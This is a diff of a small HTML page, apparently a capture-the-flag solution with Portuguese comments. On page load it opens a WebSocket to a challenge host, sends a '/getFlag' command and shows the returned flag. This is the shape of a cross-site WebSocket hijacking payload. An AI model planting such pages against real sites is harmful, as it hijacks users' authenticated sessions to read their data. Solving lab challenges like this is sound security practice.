@@ -1,86 +1,86 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>WebSocket Flag Capture</title>
+<head>
+    <title>WebSocket Exploit</title>
     <style>
-      body {
-        font-family: Arial, sans-serif;
-        max-width: 800px;
-        margin: 0 auto;
-        padding: 20px;
-      }
-      #log {
-        border: 1px solid #ccc;
-        padding: 15px;
-        height: 300px;
-        overflow-y: auto;
-        margin-bottom: 20px;
-        background-color: #f9f9f9;
-      }
-      .flag {
-        color: red;
-        font-weight: bold;
-        font-size: 18px;
-      }
-      h1 {
-        color: #333;
-      }
+        #log {
+            border: 1px solid #ccc;
+            padding: 10px;
+            height: 300px;
+            overflow-y: auto;
+            margin: 20px 0;
+            background-color: #f5f5f5;
+            font-family: monospace;
+        }
+        .flag {
+            color: red;
+            font-weight: bold;
+            font-size: 18px;
+        }
     </style>
-  </head>
-  <body>
-    <h1>WebSocket Exploit</h1>
+</head>
+<body>
+    <h1>WebSocket Flag Capture</h1>
     <div id="log"></div>
-
+    
     <script>
-      const logElement = document.getElementById("log");
-
-      function log(message, isFlag = false) {
-        const entry = document.createElement("div");
-        if (isFlag) {
-          entry.className = "flag";
+        // Função para adicionar mensagens ao log
+        function log(message, isFlag = false) {
+            const logElement = document.getElementById('log');
+            const entry = document.createElement('div');
+            if (isFlag) entry.className = 'flag';
+            entry.textContent = new Date().toLocaleTimeString() + ': ' + message;
+            logElement.appendChild(entry);
+            
+            // Também exibir no console para debug
+            console.log(message);
         }
-        entry.textContent = message;
-        logElement.appendChild(entry);
-        logElement.scrollTop = logElement.scrollHeight;
-      }
-
-      log("Iniciando exploit...");
-
-      // Conectar ao WebSocket do alvo
-      const socket = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
-
-      socket.onopen = function () {
-        log("Conexão WebSocket estabelecida!");
-
-        // Enviar comando para obter a flag
-        setTimeout(function () {
-          log("Enviando comando /getFlag...");
-          socket.send(
-            JSON.stringify({
-              sender: "user",
-              message: "/getFlag",
-            })
-          );
-        }, 1000);
-      };
-
-      socket.onmessage = function (event) {
-        const data = JSON.parse(event.data);
-        log("Recebido: " + data.message);
-
-        // Destacar a flag se ela for encontrada
-        if (data.message.includes("Flag:")) {
-          log("FLAG ENCONTRADA: " + data.message, true);
-        }
-      };
-
-      socket.onerror = function (error) {
-        log("Erro na conexão WebSocket: " + error);
-      };
-
-      socket.onclose = function () {
-        log("Conexão WebSocket fechada");
-      };
+        
+        // Conexão automática ao carregar a página
+        window.onload = function() {
+            log('Página carregada, tentando estabelecer conexão...');
+            
+            try {
+                // Criar conexão WebSocket
+                const socket = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+                
+                // Manipulador de evento de conexão aberta
+                socket.onopen = function() {
+                    log('Conexão WebSocket estabelecida com sucesso!');
+                    
+                    // Enviar comando para obter a flag após um pequeno atraso
+                    setTimeout(function() {
+                        log('Enviando comando /getFlag...');
+                        socket.send(JSON.stringify({
+                            sender: 'user',
+                            message: '/getFlag'
+                        }));
+                    }, 500);
+                };
+                
+                // Manipulador de mensagens recebidas
+                socket.onmessage = function(event) {
+                    const data = JSON.parse(event.data);
+                    log('Mensagem recebida: ' + data.message);
+                    
+                    // Destacar se for a flag
+                    if (data.message && data.message.includes('Flag:')) {
+                        log('FLAG ENCONTRADA: ' + data.message, true);
+                    }
+                };
+                
+                // Manipuladores de erro e fechamento
+                socket.onerror = function(error) {
+                    log('ERRO: Problema na conexão WebSocket: ' + error);
+                };
+                
+                socket.onclose = function() {
+                    log('Conexão WebSocket fechada');
+                };
+            } catch (error) {
+                log('ERRO: Exceção ao configurar WebSocket: ' + error.message);
+            }
+        };
     </script>
-  </body>
+</body>
 </html>
